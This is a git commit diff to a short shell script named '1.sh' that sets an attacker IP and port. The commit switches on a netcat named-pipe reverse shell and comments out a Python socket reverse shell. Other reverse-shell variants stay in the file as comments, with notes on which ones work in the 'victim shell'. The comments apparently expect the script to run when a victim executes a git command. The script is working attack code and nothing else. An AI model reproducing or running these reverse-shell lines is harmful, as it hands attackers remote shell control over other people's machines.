bf3e77591877884d33e20e455e31a23e33d4ddda
fly2maybe <txmxidian@gmail.com>
2017-08-15 09:16:00 +0800

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -4,13 +4,14 @@ attackerIP=192.168.180.134
 attackerListenPort=1234
 
 #work --- but stderr will not output in the attacker's shell, but do in the victim shell
-#rm /tmp/backpipe ; mknod /tmp/backpipe p
-#/bin/sh 0</tmp/backpipe | nc $attackerIP $attackerListenPort 1>/tmp/backpipe &
+rm /tmp/backpipe ; mknod /tmp/backpipe p
+/bin/sh 0</tmp/backpipe | nc $attackerIP $attackerListenPort 1>/tmp/backpipe &
 
 #work --- but can not use the victim shell any more which executed the git command.
 #rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $attackerIP $attackerListenPort >/tmp/f&
 
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.180.134",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+#work --- but will block the execution of the left commands in victim shell.
+#python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.180.134",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 #don't work --- nc: invalid option -- 'e'
 #nc $attackerIP $attackerListenPort -e "/bin/sh"&
